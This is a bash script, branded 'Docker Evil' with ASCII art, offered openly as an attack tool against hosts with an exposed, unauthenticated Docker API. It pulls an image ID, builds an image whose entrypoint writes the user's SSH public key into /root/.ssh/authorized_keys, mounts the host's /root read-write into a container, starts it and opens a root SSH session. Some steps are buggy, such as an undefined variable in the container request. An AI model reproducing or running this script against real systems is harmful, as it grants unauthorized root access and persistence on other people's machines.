#!/bin/bash

#skiddie
# v2

echo "                   @@/.......(((((((#&@@.                            "
echo "               (#.........#((((((((((((((((@@                        "
echo "             @,.......  *((((  (((((((((((((((%@                     "
echo "            @@@@@&%###(  ((  #(((((((((((((((((((@(                  "
echo "           &((((((((((((#  ((((((((((((((((((((((((&(                "
echo "          @((((((((((((  ((  ((((((((((((((((((((((((@               "
echo "         ##((((((((((  ((((((  (((((((((((((((((((((((%&             "
echo "         @((#%%%%#((((((#%%%%%%#((((#%%%%%%#(((((#%%%%#(@            "
echo "         @(((((((((((((((((((((((((((((((((((((((((((((((@           "
echo "         ,.......................................,%@@#(((#%&&@@      "
echo "                        ,#//*          (/((((         @#((((((((%&   "
echo "                      ((##((/  ((((/(  (((#(#/       @((((##((((((@( "
echo "                       ##(((((,#(#(((  #((#(#%       @((((%.  .*     "
echo "                        /#  #.(#(#(((                @((((@          "
echo "                           ##(((/%                   *%(@,           "
echo "                          ###(///     #(((   #/(%,     *             "
echo "                            %(((/   ./((((((*(#(#(/                  "
echo "                                     #####( ##(#(((                  "
echo "                                       ((.     .(#/                  "
echo "________                 __                  ___________     .__.__   "
echo "\______ \   ____   ____ |  | __ ___________  \_   _____/__  _|__|  |  "
echo " |    |  \ /  _ \_/ ___\|  |/ // __ \_  __ \  |    __)_\  \/ /  |  |  "
echo " | __ /   (  <_> )  \___|    <\  ___/|  | \/  |    |_ /\\   /|  |  |__"
echo "/_______  /\____/ \___  >__|_ \\___  >__|    /_______  / \_/ |__|____/"
echo "        \/            \/     \/    \/                \/               "

## Looking for user's parameters along with the command
if [ $1 == "-h" ] 2> /dev/null
then
	echo -e "\n Insert the desired host and port: \n"
	read HOST

	echo "Getting image ID................\n"
	curl -s http://$HOST/images/json | json_pp | awk '/sha256:/ {print $3}' | tr -d '"' | tr -d ',' | cut -d ":" -f2,2 > /tmp/IMG_ID.dkr
	IMG_ID=$(head -n1 /tmp/IMG_ID.dkr)
	echo "Done\n"

	echo "Getting thy SSH key....................."
	RSA=$(cat ~/.ssh/id_rsa.pub | awk '/ssh-rsa/ {print $2}')
	echo "Done\n"

	echo "Writing Dockerfile"
	echo -e "FROM $IMG_ID \nUSER root \nENTRYPOINT echo '"$RSA"' >> /root/.ssh/authorized_keys" > Dockerfile
	tar -cf dockerevil.tar Dockerfile 2> /dev/null
	echo "Done"


	echo "Building image with custom entrypoint"
	curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" | grep -o "built ............" > skiddie



	IMG_ID=$( cut -d " " -f2,2 skiddie)
	rm skiddie
	echo "Done"
	echo "Creating image"
	IMG_ID=$(curl -H "Content-Type: application/json" -d '{"Image" : "'"$IMG"'", "Binds" : ["/root/:/root/:rw,z"]}' -XPOST "http://$HOST/containers/create" | awk -F ":" ' {print $2} '| awk -F "," ' {print $1}' | sed 's/"//g')
	echo "Done"
	echo "Starting image"
	curl -s -XPOST http://$HOST/containers/$IMG_ID/start -v 2> /dev/null
	echo "Done"
	ssh_host=$(echo $HOST | awk -F ":" ' {print $1} ')
	ssh root@$ssh_host

else
	echo -e "\nThis program needs at least one parameter. Try --help\n"
fi
